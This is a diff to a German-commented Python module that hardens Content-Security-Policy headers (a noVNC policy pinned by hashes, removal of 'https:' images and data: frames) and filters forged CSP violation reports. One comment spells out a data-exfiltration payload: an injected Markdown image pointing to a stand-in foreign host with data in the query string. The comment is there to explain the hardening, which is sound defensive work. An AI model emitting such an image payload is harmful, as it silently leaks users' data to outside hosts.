@@ -40,10 +40,23 @@ Browser schickt Berichte ohne Token. Deshalb:
   * keine IP und kein vollstaendiger User-Agent in der Datei (Personenbezug).
 Aufbewahrung nur nach ALTER ueber ``log_retention`` – keine Stueckzahlgrenze.
 
-AUSGENOMMEN: ``/novnc/`` – das ist das Systempaket noVNC (``/usr/share/novnc``),
-das selbst ein Inline-Modul-Skript traegt; es laeuft nur im Desktop-Rahmen fuer
-Admins. Eine Richtlinie dort wuerde den Desktop nach dem Scharfschalten
-brechen, ohne dass wir den Inhalt aendern koennten.
+NOVNC (``/novnc/``, Systempaket ``/usr/share/novnc``): bis 2026-11-05 ganz
+ohne Richtlinie, weil vnc.html ein Inline-Modul-Skript traegt, das wir nicht
+aendern koennen. Seitdem eine EIGENE Richtlinie (``richtlinie_novnc``): nur
+eigene Skripte plus die sha256-Hashes genau der Inline-Skripte, die das
+installierte Paket mitbringt (aus den HTML-Dateien des Pakets gelesen, nicht
+abgetippt – ein Paket-Update bringt seine Hashes selbst mit). Lassen sich die
+Dateien nicht lesen, faellt nur DIESE Seite auf ``'unsafe-inline'`` zurueck
+(laut im Journal) – fremde Skript-Hosts bleiben auch dann gesperrt.
+
+MELDUNGEN, HERKUNFT (Pentest-Vorbereitung 2026-11-05): der Endpunkt ist ohne
+Anmeldung erreichbar, und das Tageskontingent liess sich mit erfundenen
+Berichten aufbrauchen – danach waeren echte Verstoesse an dem Tag nicht mehr
+geschrieben worden. Angenommen wird ein Bericht nur noch, wenn seine Seite
+(``document-uri``) auf dem Host liegt, an den er geschickt wurde (der Browser
+meldet an ``report-uri`` derselben Herkunft). Liegt dieser Host nicht unter
+den eigenen Namen (Serverzertifikat), zaehlt der Bericht gegen ein eigenes,
+kleines Kontingent ``TAG_MAX_FREMD`` – der Platz fuer echte Meldungen bleibt.
 """
 from __future__ import annotations
 
@@ -67,6 +80,10 @@ FELD_MAX = 300
 # Adressen beliebig viel. Ein echter Verstoss steht je Tag EINMAL in der Datei;
 # mehr als ein paar hundert verschiedene am Tag hat keine echte Seite.
 TAG_MAX_ZEILEN = 1000
+# Bruchteil fuer Berichte, deren Host nicht unter den eigenen Namen steht
+# (Zugriff ueber IP, untergeschobener Host-Kopf). Eigener Zaehler: sie koennen
+# das Kontingent der echten Meldungen nicht aufbrauchen.
+TAG_MAX_FREMD = TAG_MAX_ZEILEN // 20
 DATEI_MAX = 5 * 1024 * 1024
 GESEHEN_MAX = 20000
 
@@ -90,7 +107,8 @@ _OFFICE_RAHMEN = "https://telemetryservice.firstpartyapps.oaspapps.com"
 # Add-in-Seiten – angenommenes Restrisiko, weil Microsofts Bibliothek es
 # erzwingt; alle anderen Seiten bleiben ohne (Waechter test_csp_h4 [A]).
 _OFFICE_EVAL = "'unsafe-eval'"
-_AUSGENOMMEN = ("/novnc/",)
+_NOVNC_PRAEFIX = "/novnc/"
+_AUSGENOMMEN: tuple = ()
 # Wer die Add-in-Seiten einrahmen darf (BSI H7): Outlook/Excel im Web laden das
 # Aufgabenfenster in einen iframe von Microsofts Hosts. Alle anderen Seiten nur
 # 'self'. ⚠ Im Modus "melden" (Report-Only) wertet der Browser frame-ancestors
@@ -113,11 +131,16 @@ _office_hosts_quelle = None
 _RAHMEN_HOST_OK = re.compile(r"^[a-z0-9](?:[a-z0-9\-]{0,62}\.)*[a-z0-9\-]{1,63}$")
 
 _get_setting = None
+_eigene_namen_quelle = None
+_eigene_namen_cache: dict = {"ts": 0.0, "namen": frozenset()}
+_novnc_ordner = None
+_novnc_cache: dict = {"schluessel": None, "hashes": None}
 _SPERRE = threading.Lock()
 _rate: dict[str, list[float]] = {}
 _gesehen: dict[str, int] = {}          # Schluessel -> Anzahl (seit Dienststart)
 _gesehen_tag: dict[str, str] = {}      # Schluessel -> Tag des letzten Schreibens
 _tag_zeilen: dict[str, int] = {}       # Tag -> geschriebene Zeilen (nur der heutige)
+_tag_fremd: dict[str, int] = {}        # Tag -> Zeilen aus fremden Hosts (nur der heutige)
 
 
 def einstellungen_quelle(fn) -> None:
@@ -132,6 +155,105 @@ def office_hosts_quelle(fn) -> None:
     """``main`` reicht ``addin_sso.rahmen_hosts`` herein (Exchange-Hosts im Haus)."""
     global _office_hosts_quelle
     _office_hosts_quelle = fn
+
+
+def eigene_namen_quelle(fn) -> None:
+    """``main`` reicht die DNS-Namen/Adressen des Serverzertifikats herein."""
+    global _eigene_namen_quelle
+    _eigene_namen_quelle = fn
+    _eigene_namen_cache["ts"] = 0.0
+
+
+def _eigene_namen() -> frozenset:
+    """Eigene Hostnamen (klein, ohne Port), 5 min gemerkt. Fehler -> leer."""
+    jetzt = time.time()
+    if jetzt - _eigene_namen_cache["ts"] < 300:
+        return _eigene_namen_cache["namen"]
+    namen = frozenset()
+    if _eigene_namen_quelle is not None:
+        try:
+            namen = frozenset(str(n).strip().lower().strip("[]")
+                              for n in (_eigene_namen_quelle() or ()) if str(n).strip())
+        except Exception:  # noqa: BLE001
+            namen = frozenset()
+    _eigene_namen_cache.update(ts=jetzt, namen=namen)
+    return namen
+
+
+def novnc_ordner(pfad) -> None:
+    """``main`` nennt das Verzeichnis, aus dem /novnc ausgeliefert wird."""
+    global _novnc_ordner
+    _novnc_ordner = Path(pfad) if pfad else None
+    _novnc_cache.update(schluessel=None, hashes=None)
+
+
+_INLINE_SKRIPT = re.compile(r"<script\b(?![^>]*\bsrc\s*=)[^>]*>(.*?)</script\s*>",
+                            re.IGNORECASE | re.DOTALL)
+
+
+def _novnc_hashes():
+    """sha256-Quellen der Inline-Skripte in den HTML-Dateien von noVNC.
+
+    ``None`` = nicht ermittelbar (kein Ordner, nicht lesbar). Gemerkt je
+    (Datei, mtime, Groesse) – ein Paket-Update bringt neue Hashes mit."""
+    import base64
+    import hashlib
+    ordner = _novnc_ordner
+    if ordner is None:
+        return None
+    try:
+        dateien = sorted(p for p in ordner.glob("*.html") if p.is_file())
+        schluessel = tuple((p.name, p.stat().st_mtime_ns, p.stat().st_size) for p in dateien)
+    except Exception:  # noqa: BLE001
+        return None
+    if not dateien:
+        return None
+    if _novnc_cache["schluessel"] == schluessel:
+        return _novnc_cache["hashes"]
+    hashes = set()
+    try:
+        for p in dateien:
+            for inhalt in _INLINE_SKRIPT.findall(p.read_text(encoding="utf-8")):
+                d = base64.b64encode(hashlib.sha256(inhalt.encode("utf-8")).digest()).decode()
+                hashes.add("'sha256-%s'" % d)
+    except Exception as ex:  # noqa: BLE001
+        print(f"[CSP] noVNC-Skripte nicht lesbar ({type(ex).__name__}) – /novnc/ "
+              "erlaubt Inline-Skripte", flush=True)
+        hashes = None
+    erg = tuple(sorted(hashes)) if hashes is not None else None
+    _novnc_cache.update(schluessel=schluessel, hashes=erg)
+    return erg
+
+
+def richtlinie_novnc(host: str = "") -> str:
+    """Richtlinie fuer die noVNC-Seiten (Desktop-Rahmen fuer Administratoren).
+
+    Nur eigene Skripte plus die Hashes der mitgelieferten Inline-Skripte; die
+    Verbindung geht ueber wss:// zum EIGENEN Host (/ws/vnc). Einrahmen nur
+    durch die eigene Seite (Portal-Desktop). Bilder: eigene + data: (noVNC
+    setzt den Mauszeiger als data:-Bild)."""
+    hashes = _novnc_hashes()
+    if hashes is None:
+        skript = "'self' 'unsafe-inline'"
+    else:
+        skript = " ".join(("'self'",) + tuple(hashes))
+    verbinden = _verbinden(host)
+    return "; ".join([
+        "default-src 'self'",
+        "script-src " + skript,
+        "style-src 'self' 'unsafe-inline'",
+        "img-src 'self' data: blob:",
+        "font-src 'self' data:",
+        "connect-src " + verbinden,
+        "media-src 'self' data: blob:",
+        "frame-src 'none'",
+        "worker-src 'self' blob:",
+        "object-src 'none'",
+        "base-uri 'self'",
+        "form-action 'self'",
+        "frame-ancestors 'self'",
+        "report-uri " + MELDE_PFAD,
+    ])
 
 
 def _eigene_office_rahmen() -> str:
@@ -190,6 +312,15 @@ def pfad_normal(pfad: str) -> str:
 _HOST_OK = re.compile(r"^[A-Za-z0-9.\-]+(:\d{1,5})?$|^\[[0-9A-Fa-f:.]+\](:\d{1,5})?$")
 
 
+def _verbinden(host: str) -> str:
+    """connect-src: eigene Herkunft plus wss:// zum eigenen Host (EINE Fassung
+    fuer die allgemeine und die noVNC-Richtlinie)."""
+    verbinden = "'self'"
+    if host and _HOST_OK.match(host):
+        verbinden += " wss://" + host
+    return verbinden
+
+
 def richtlinie(pfad: str, host: str = "") -> str:
     """Die Richtlinie fuer eine HTML-Antwort unter ``pfad``.
 
@@ -207,22 +338,32 @@ def richtlinie(pfad: str, host: str = "") -> str:
         eigene = _eigene_office_rahmen()
         if eigene:
             rahmen_von += " " + eigene
-    verbinden = "'self'"
-    if host and _HOST_OK.match(host):
-        verbinden += " wss://" + host
+    verbinden = _verbinden(host)
     teile = [
         "default-src 'self'",
         "script-src " + skript,
         # Inline-Stile erlaubt: angenommenes Restrisiko (siehe Modulkopf).
         "style-src 'self' 'unsafe-inline'",
-        # Chat rendert Markdown-Bilder auch von https-Zielen; data:/blob: fuer
-        # Vorschauen, Diagramme und hochgeladene Bilder.
-        "img-src 'self' data: blob: https:",
+        # Nur eigene Bilder (Pentest-Vorbereitung 2026-11-05): mit "https:"
+        # lud ein eingeschleustes Markdown-Bild ![x](https://fremd/?d=...) beim
+        # Anzeigen und schickte Daten ohne Klick weg. Die Renderer machen aus
+        # fremden Bildern inzwischen Links (chatlib.js, wissen_destillat.js);
+        # das hier ist die zweite Linie. data:/blob: fuer Vorschauen,
+        # Diagramme, QR-Codes und hochgeladene Bilder. Gemessen 2026-11-05:
+        # keine Seite laedt ein Bild absichtlich von fremdem Host (Bildsuche
+        # und Bildgenerierung liefern ueber /api/generated/, Branding-Logos
+        # ueber /api/branding/logo). AUSNAHME Add-in-Seiten: dort steuert
+        # office.js die Oberflaeche des Hosts; sie rendern keine Markdown-Bilder.
+        "img-src 'self' data: blob:" + (" https:" if addin else ""),
         "font-src 'self' data:",
         "connect-src " + verbinden,
         "media-src 'self' data: blob:",
         # PDF-/Dokumentvorschau im Rahmen (blob:), Desktop-Rahmen (/novnc).
-        "frame-src 'self' blob: data:" + (" " + _OFFICE_JS + " " + _OFFICE_RAHMEN if addin else ""),
+        # OHNE data: (Pentest-Vorbereitung 2026-11-05): ein data:-Rahmen ist
+        # eine vollstaendige, frei gestaltete Seite im Fenster – der klassische
+        # Phishing-Rahmen. Gemessen: kein Frontend-Modul oeffnet einen; die
+        # Vorschauen laufen ueber blob: bzw. eigene Adressen.
+        "frame-src 'self' blob:" + (" " + _OFFICE_JS + " " + _OFFICE_RAHMEN if addin else ""),
         "worker-src 'self' blob:",
         "object-src 'none'",
         "base-uri 'self'",
@@ -235,12 +376,15 @@ def richtlinie(pfad: str, host: str = "") -> str:
 
 def kopfzeilen(pfad: str, host: str = "") -> dict[str, str]:
     """Die zu setzenden Kopfzeilen fuer eine HTML-Antwort – leer, wenn keine."""
-    if any(pfad_normal(pfad).startswith(p) for p in _AUSGENOMMEN):
+    normal = pfad_normal(pfad)
+    if any(normal.startswith(p) for p in _AUSGENOMMEN):
         return {}
     m = modus()
     if m == "aus":
         return {}
     name = "Content-Security-Policy" if m == "erzwingen" else "Content-Security-Policy-Report-Only"
+    if normal.startswith(_NOVNC_PRAEFIX):
+        return {name: richtlinie_novnc(host)}
     return {name: richtlinie(pfad, host)}
 
 
@@ -308,8 +452,47 @@ def _rate_ok(ip: str, jetzt: float) -> bool:
     return True
 
 
-def melden(koerper: bytes, ip: str = "", ua: str = "") -> int:
+def _host_ohne_port(wert: str) -> str:
+    """``Host``-Kopf bzw. Netzort einer URL -> Hostname klein, ohne Port."""
+    h = str(wert or "").strip().lower()
+    if h.startswith("["):
+        return h[1:h.find("]")] if "]" in h else ""
+    return h.rsplit(":", 1)[0] if h.count(":") == 1 else h
+
+
+def herkunft(seite: str, host: str) -> str:
+    """Einordnung eines Berichts: ``"eigen"``, ``"fremd"`` oder ``""`` (verwerfen).
+
+    Verworfen wird, wenn die gemeldete Seite NICHT auf dem Host liegt, an den
+    der Bericht ging – ein Browser meldet an ``report-uri`` derselben Herkunft,
+    eine Abweichung ist erfunden. ``fremd`` = der Host steht nicht unter den
+    eigenen Namen (Zertifikat); sind keine bekannt, gilt jeder passende Host
+    als eigen (sonst ginge auf einem Server ohne lesbares Zertifikat jede
+    echte Meldung ins kleine Kontingent)."""
+    from urllib.parse import urlsplit
+    try:
+        seiten_host = (urlsplit(str(seite or "")).hostname or "").lower()
+    except Exception:  # noqa: BLE001
+        return ""
+    anfrage_host = _host_ohne_port(host)
+    if not seiten_host or not anfrage_host or seiten_host != anfrage_host:
+        return ""
+    namen = _eigene_namen()
+    if not namen or anfrage_host in namen:
+        return "eigen"
+    # Platzhalter im Zertifikat (*.firma.de) deckt genau EINE Ebene.
+    for n in namen:
+        if n.startswith("*.") and anfrage_host.endswith(n[1:]) \
+                and "." not in anfrage_host[:-len(n) + 1]:
+            return "eigen"
+    return "fremd"
+
+
+def melden(koerper: bytes, ip: str = "", ua: str = "", host: str = "") -> int:
     """Einen Melde-Aufruf verarbeiten. Rueckgabe = Zahl NEU geschriebener Zeilen.
+
+    ``host`` = Host-Kopf der Melde-Anfrage (siehe ``herkunft``); fehlt er,
+    wird nichts angenommen.
 
     Wirft NIE: ein kaputter Bericht ist kein Serverfehler, und der Browser
     wertet die Antwort ohnehin nicht aus."""
@@ -328,6 +511,9 @@ def melden(koerper: bytes, ip: str = "", ua: str = "") -> int:
             e = _normalisieren(r)
             if not e:
                 continue
+            art = herkunft(e["seite"], host)
+            if not art:
+                continue
             schluessel = "|".join((e["seite"], e["direktive"], e["blockiert"],
                                    e["quelle"], e["zeile"]))
             with _SPERRE:
@@ -344,6 +530,12 @@ def melden(koerper: bytes, ip: str = "", ua: str = "") -> int:
                     continue
                 if _tag_zeilen.get(tag, 0) >= TAG_MAX_ZEILEN:
                     continue
+                if art == "fremd":
+                    if _tag_fremd.get(tag, 0) >= TAG_MAX_FREMD:
+                        continue
+                    if tag not in _tag_fremd:
+                        _tag_fremd.clear()
+                    _tag_fremd[tag] = _tag_fremd.get(tag, 0) + 1
                 if tag not in _tag_zeilen:
                     _tag_zeilen.clear()
                 _tag_zeilen[tag] = _tag_zeilen.get(tag, 0) + 1
